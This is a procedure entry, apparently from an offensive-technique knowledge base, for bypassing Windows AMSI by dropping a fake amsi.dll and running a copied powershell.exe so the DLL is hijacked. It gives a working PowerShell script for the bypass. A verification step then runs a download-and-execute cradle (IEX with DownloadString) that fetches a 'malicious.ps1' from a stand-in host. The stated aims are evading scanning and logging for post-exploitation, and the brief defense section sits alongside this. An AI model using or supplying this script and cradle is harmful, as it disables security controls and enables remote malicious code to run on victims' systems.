---
id: 682bba3a-8aea-4a1d-95d8-d66387cedaaf
name: Bypass-AMSI-via-DLL-Hijacking-and-Reflection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.070078+00:00'
updated_at: '2023-04-10T20:36:16.918584+00:00'
tactics:
  - '[[Execution]]'
  - '[[Defense Evasion]]'
techniques:
  - '[[PowerShell]]'
  - '[[Disable or Modify Tools]]'
sub_techniques: []
tags:
  - powershell
  - amsi-bypass
  - dll-hijacking
  - reflection
commands:
  - '[[commands/powershell-bypass-amsi-dll-hijack]]'
platforms:
  - Windows
tools: []
validated: true
---

# Bypass-AMSI-via-DLL-Hijacking-and-Reflection

## Summary

This procedure demonstrates a technique to bypass the Anti-Malware Scan Interface (AMSI) in PowerShell using a combination of Matt Graeber's reflection method for in-memory loading and Cornelis de Plaas's DLL hijacking approach. By dropping a fake amsi.dll to disk and executing PowerShell from the current directory, attackers can evade AMSI scanning and Windows Management Framework (WMF) 5 logging, allowing malicious script execution without detection.

## Description

Attackers often face restrictions from AMSI, which scans PowerShell scripts for malicious content before execution. This procedure uses DLL hijacking by placing a malicious or fake amsi.dll in the execution path of PowerShell, combined with reflection to load code into memory without triggering logging. The target environment is a Windows system with PowerShell v1.0 or later installed. Prerequisites include local execution privileges on the victim's machine. Upon success, PowerShell runs in a bypassed state, enabling further malicious activities like payload execution or lateral movement. This maps to execution via PowerShell interpreters and defense evasion by disabling security tools.

## Requirements

1. Local access to the victim's Windows machine with PowerShell installed (v1.0 or higher).
2. Ability to write files to the current working directory.
3. The byte array for the fake amsi.dll ($DllBytes) must be prepared in advance, typically containing a benign or modified DLL that returns a non-blocking response to AMSI scans.
4. No administrative privileges required, but elevated access enhances persistence.

## Defense

- Implement application whitelisting (e.g., AppLocker or WDAC) to prevent unauthorized binaries and scripts from running.
- Monitor PowerShell activity for anomalies, including reflection loading, DLL writes to unexpected paths, and copies of powershell.exe.
- Enable AMSI logging and PowerShell transcription; regularly review Event Logs for AMSI bypass attempts (Event ID 4104).
- Keep Windows and PowerShell updated to patch known bypass vulnerabilities; use endpoint detection tools to alert on file drops in working directories.

## Objectives

1. Bypass AMSI to allow execution of malicious PowerShell code without scanning.
2. Evade WMF 5 autologging using reflection for in-memory execution.
3. Achieve undetected PowerShell runtime on the victim's machine for further post-exploitation.

## Instructions

### Step 1: Prepare the Fake AMSI DLL Bytes

**Context**: Define the $DllBytes variable with the byte array representing a fake amsi.dll. This DLL should be crafted to return AmsiScanBuffer as AMSI_RESULT_CLEAN without performing actual scans. Obtain or generate this bytes array from known bypass resources.

> Note: The exact bytes for $DllBytes are not provided in the original snippet and must be sourced separately (e.g., from public AMSI bypass implementations).

### Step 2: Execute the AMSI Bypass Script

**Context**: Run the PowerShell script to drop the fake amsi.dll, copy powershell.exe to the current directory (enabling DLL hijacking), and launch the bypassed PowerShell instance. This step uses reflection implicitly through the hijack to avoid logging.

**Command** ([[commands/powershell-bypass-amsi-dll-hijack]]):

```powershell
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```

> This command assumes $DllBytes is defined prior to execution. It writes the fake DLL, copies the executable to hijack the load path, and starts PowerShell, which loads the fake DLL instead of the real amsi.dll, bypassing scans.

**Code** ([[codes/PowerShell-AMSI-Bypass-via-DLL-Hijack]]):

The code snippet above is the core payload; refer to the linked code for full details and parameters.

### Step 3: Verify Bypass and Execute Payload

**Context**: In the new PowerShell session, test the bypass by attempting to run a known malicious command (e.g., one that would normally trigger AMSI) and confirm no blocking occurs.

**Command** (Test example using built-in PowerShell):

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')
```

> If the bypass succeeds, the script downloads and executes without AMSI intervention. Monitor for errors; success is indicated by no AMSI-related blocks in logs.
